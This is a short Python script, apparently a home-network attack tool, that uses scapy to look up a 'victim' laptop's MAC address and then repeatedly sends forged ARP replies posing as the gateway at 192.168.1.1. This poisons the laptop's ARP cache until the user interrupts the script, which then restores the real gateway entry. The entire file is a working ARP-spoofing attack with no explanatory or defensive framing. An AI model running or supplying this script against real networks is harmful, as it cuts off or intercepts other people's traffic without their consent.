from scapy.all import ARP, Ether, srp, sendp
import time 

IP_adress = "192.168.1.187"
default_gateway = "192.168.1.1"

def get_MAC_adress():
    global IP_adress
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP_adress)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    if not answered:
        raise SystemExit(f"Could not find {IP_adress}. Is the laptop awake and on the same Wi-Fi?")
    MAC_adress = answered[0][1].hwsrc
    return MAC_adress

def spoof(victim_MAC):
    global IP_adress
    packet = Ether(dst=victim_MAC) / ARP(op=2, pdst=IP_adress, hwdst=victim_MAC, psrc=default_gateway)
    sendp(packet, verbose=False)

def restore(victim_MAC):
    global IP_adress, default_gateway
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=default_gateway)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    gateway_MAC = answered[0][1].hwsrc
    packet = Ether(dst=victim_MAC) / ARP(op=2, pdst=IP_adress, hwdst=victim_MAC, psrc=default_gateway, hwsrc=gateway_MAC)
    sendp(packet, count=5, verbose=False)

victim_MAC = get_MAC_adress()
try:
    while True:
        spoof(victim_MAC)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStopping attack, restoring laptop's connection...")
    restore(victim_MAC)
    print("Done. Laptop reconnected.")
    